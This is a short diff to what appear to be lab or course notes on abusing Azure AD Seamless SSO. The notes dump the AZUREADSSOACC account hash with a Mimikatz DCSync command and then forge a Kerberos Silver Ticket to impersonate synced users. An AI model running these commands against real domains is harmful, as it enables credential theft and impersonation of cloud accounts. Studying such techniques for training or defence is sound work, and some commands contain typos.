@@ -36,3 +36,8 @@
 - password/key of the AZUREADSSOACC never changes 
 - if we can compromise the NTLM hash of the AZUREADSSOACC machine account, we can create Silver Ticket for any synced on-prem user
 ` Invoke-Mimikatz -Command '"lasdump::dcsync /user:defeng\azureasssoacc$ /domain:defeng.corp /dc:defeng-dc.defeng.corp `
+- we just need the userPrinicpalName and SID of the user to create the Silver ticket that can be used from any machine connected to the internet. 
+` Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin1 /sid:S-1-5-21-938785110-3291390659-577725712 /id:1108 /domain:defeng.corp /rc4:<> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt`
+- the lab environment(for both PHS and PTA) uses different UPN prefixes for on-prem and Azure domain so the SSO will not work. 
+
+`https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/`
